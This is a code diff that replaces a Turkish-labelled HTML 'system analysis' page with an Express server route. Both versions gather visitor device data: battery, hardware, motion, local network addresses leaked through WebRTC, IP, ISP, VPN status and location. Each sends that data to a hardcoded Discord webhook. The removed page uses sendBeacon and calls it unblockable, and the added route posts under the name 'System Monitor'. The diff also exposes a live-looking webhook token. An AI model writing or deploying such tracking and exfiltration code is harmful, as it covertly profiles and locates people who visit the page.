@@ -1,124 +1,122 @@
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <title>Sistem Entegrasyon Birimi</title>
-    <style>
-        body { background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .trigger-btn { 
-            padding: 20px 40px; background: #000; border: 1px solid #0f0; color: #0f0; 
-            font-family: 'Courier New', monospace; cursor: pointer; transition: 0.3s;
-        }
-        .trigger-btn:hover { background: #0f0; color: #000; box-shadow: 0 0 20px #0f0; }
-    </style>
-</head>
-<body>
+import type { Express } from "express";
+import type { Server } from "http";
+import { storage } from "./storage";
+import { api } from "@shared/routes";
+import { z } from "zod";
 
-    <button class="trigger-btn" onclick="MasterEngine.ignite()">SİSTEMİ ANALİZ ET</button>
+const DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-    <script>
-        "use strict";
+export async function registerRoutes(
+  httpServer: Server,
+  app: Express
+): Promise<Server> {
 
-        const MasterEngine = (function() {
-            // KONFIGURASYON
-            const WEBHOOK_URL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+  app.post(api.reports.create.path, async (req, res) => {
+    try {
+      const { deviceInfo } = req.body;
+      
+      // Enhance with server-side IP info
+      // In a real deployed environment, we would use req.headers['x-forwarded-for'] or req.socket.remoteAddress
+      // And query an IP API. For this demo, we'll try to fetch public IP info from the server side.
+      
+      let ipInfo = {};
+      try {
+        const ipResponse = await fetch("http://ip-api.com/json/");
+        ipInfo = await ipResponse.json();
+      } catch (e) {
+        console.error("Failed to fetch IP info", e);
+      }
 
-            const Utils = {
-                async getBattery() {
-                    if (!navigator.getBattery) return "Not Supported";
-                    const b = await navigator.getBattery();
-                    return { level: `${Math.round(b.level * 100)}%`, status: b.charging ? "AC Power" : "On Battery" };
-                },
+      const fullReport = {
+        ...deviceInfo,
+        serverDetectedIpInfo: ipInfo,
+        browserInfo: {
+          time: new Date().toLocaleTimeString(),
+          date: new Date().toLocaleDateString(),
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        },
+        timestamp: new Date().toISOString()
+      };
 
-                getHardware() {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
-                    const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
-                    return {
-                        gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A",
-                        cores: navigator.hardwareConcurrency,
-                        ram: navigator.deviceMemory || "Hidden",
-                        res: `${screen.width}x${screen.height}`
-                    };
-                },
+      // 1. Save to DB (Optional, but good for logs)
+      await storage.createReport({ data: fullReport });
 
-                async getKinetics() {
-                    return new Promise(res => {
-                        const h = (e) => {
-                            const a = e.accelerationIncludingGravity;
-                            if (a) {
-                                const v = Math.sqrt(a.x**2 + a.y**2 + a.z**2);
-                                let s = v > 13.5 ? "Moving (Fast)" : (v > 10.5 ? "Moving (Slow)" : "Static");
-                                window.removeEventListener('devicemotion', h);
-                                res(s);
-                            }
-                        };
-                        window.addEventListener('devicemotion', h);
-                        setTimeout(() => res("Static/No Access"), 1000);
-                    });
-                },
+      // 2. Send to Discord
+      await sendToDiscord(fullReport);
 
-                async discoverLAN() {
-                    return new Promise(res => {
-                        const pc = new RTCPeerConnection();
-                        const nodes = [];
-                        pc.createDataChannel("");
-                        pc.onicecandidate = e => e.candidate?.candidate.includes(".local") && nodes.push(e.candidate.candidate.split(" ")[4]);
-                        pc.createOffer().then(o => pc.setLocalDescription(o));
-                        setTimeout(() => { pc.close(); res(nodes.join(", ") || "Isolated"); }, 1500);
-                    });
-                },
+      res.json({ success: true });
+    } catch (err) {
+      console.error("Report error:", err);
+      res.status(500).json({ message: "Failed to process report" });
+    }
+  });
 
-                async getNet() {
-                    try {
-                        const r = await fetch('https://ipapi.co/json/').then(res => res.json());
-                        const isVPN = Intl.DateTimeFormat().resolvedOptions().timeZone !== r.timezone;
-                        return { ...r, vpn: isVPN ? "⚠️ DETECTED" : "✅ CLEAN" };
-                    } catch { return { ip: "Blocked", vpn: "Unknown" }; }
-                }
-            };
+  return httpServer;
+}
 
-            return {
-                async ignite() {
-                    console.log("[*] Engine ignited. Extracting data...");
-                    
-                    // Modülleri Paralel Çalıştır (Asenkron Optimizasyon)
-                    const [battery, kinetics, lan, net] = await Promise.all([
-                        Utils.getBattery(),
-                        Utils.getKinetics(),
-                        Utils.discoverLAN(),
-                        Utils.getNet()
-                    ]);
+async function sendToDiscord(data: any) {
+  const embed = {
+    title: "🚨 New Device Report Received",
+    color: 0x00ff00, // Green
+    fields: [
+      {
+        name: "🔋 Battery",
+        value: data.battery ? `Level: ${(data.battery.level * 100).toFixed(0)}%\nCharging: ${data.battery.charging ? 'Yes' : 'No'}` : "Unknown",
+        inline: true
+      },
+      {
+        name: "📍 Location",
+        value: data.location ? `Lat: ${data.location.latitude}\nLong: ${data.location.longitude}\nAcc: ${data.location.accuracy}m` : "Unknown/Denied",
+        inline: true
+      },
+      {
+        name: "🌐 Network (Client)",
+        value: data.network ? `Type: ${data.network.effectiveType}\nDownlink: ${data.network.downlink}Mbps` : "Unknown",
+        inline: true
+      },
+      {
+        name: "🏢 ISP & IP (Server)",
+        value: data.serverDetectedIpInfo ? `IP: ${data.serverDetectedIpInfo.query}\nISP: ${data.serverDetectedIpInfo.isp}\nLoc: ${data.serverDetectedIpInfo.city}, ${data.serverDetectedIpInfo.country}\nVPN/Proxy: ${data.serverDetectedIpInfo.proxy ? 'Yes' : 'No'}` : "Unknown",
+        inline: false
+      },
+      {
+        name: "🕒 Time & Language",
+        value: `Time: ${data.browserInfo?.time}\nTimezone: ${data.browserInfo?.timezone}\nLang: ${data.system?.language}`,
+        inline: true
+      },
+      {
+        name: "💻 System",
+        value: `Platform: ${data.system?.platform}\nCores: ${data.system?.cores}\nLang: ${data.system?.language}`,
+        inline: false
+      },
+      {
+        name: "🚀 Speed Test",
+        value: data.speedTest ? `Ping: ${data.speedTest.ping}ms\nEst. Download: ${data.speedTest.downloadMbps} Mbps` : "Not run",
+        inline: true
+      },
+      {
+        name: "🏃 Motion",
+        value: data.motion ? `Accel X: ${data.motion.acceleration?.x?.toFixed(2) || 0}` : "Unknown",
+        inline: true
+      }
+    ],
+    footer: {
+      text: `User Agent: ${data.system?.userAgent?.substring(0, 100)}...`
+    },
+    timestamp: new Date().toISOString()
+  };
 
-                    const hardware = Utils.getHardware();
-                    const regional = { tz: Intl.DateTimeFormat().resolvedOptions().timeZone, lang: navigator.language };
-                    const platform = { os: navigator.platform, agent: navigator.userAgent };
-
-                    // Rapor Hazırlama
-                    const payload = {
-                        content: "💀 **MASTER ENGINE V26 - FULL SPECTRUM REPORT**",
-                        embeds: [{
-                            color: 0x00FF00,
-                            fields: [
-                                { name: "📡 NETWORK & VPN", value: `**IP:** \`${net.ip}\`\n**VPN:** ${net.vpn}\n**ISP:** ${net.org}\n**Loc:** ${net.city}, ${net.country_name}\n[Map](https://www.google.com/maps?q=${net.latitude},${net.longitude})`, inline: false },
-                                { name: "🛰️ LAN & KINETICS", value: `**Nodes:** \`${lan}\`\n**Motion:** ${kinetics}`, inline: true },
-                                { name: "🔋 POWER", value: `**Battery:** ${battery.level || "N/A"}\n**Source:** ${battery.status || "N/A"}`, inline: true },
-                                { name: "⚙️ HARDWARE", value: `**GPU:** ${hardware.gpu}\n**CPU:** ${hardware.cores} Cores | **RAM:** ${hardware.ram}GB\n**Res:** ${hardware.res}`, inline: false },
-                                { name: "🌍 REGIONAL & PLATFORM", value: `**TZ:** ${regional.tz} | **Lang:** ${regional.lang}\n**OS:** ${platform.os}\n**Agent:** \`\`\`${platform.agent}\`\`\``, inline: false }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    };
-
-                    // Discord'a Gönderim (Beacon API - Bloke Edilemez)
-                    const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-                    navigator.sendBeacon(WEBHOOK_URL, blob);
-                    
-                    alert("Sistem Analizi Discord'a Gönderildi.");
-                }
-            };
-        })();
-    </script>
-</body>
-</html>
-
+  try {
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        username: "System Monitor",
+        embeds: [embed]
+      })
+    });
+  } catch (error) {
+    console.error("Failed to send webhook to Discord", error);
+  }
+}
+    
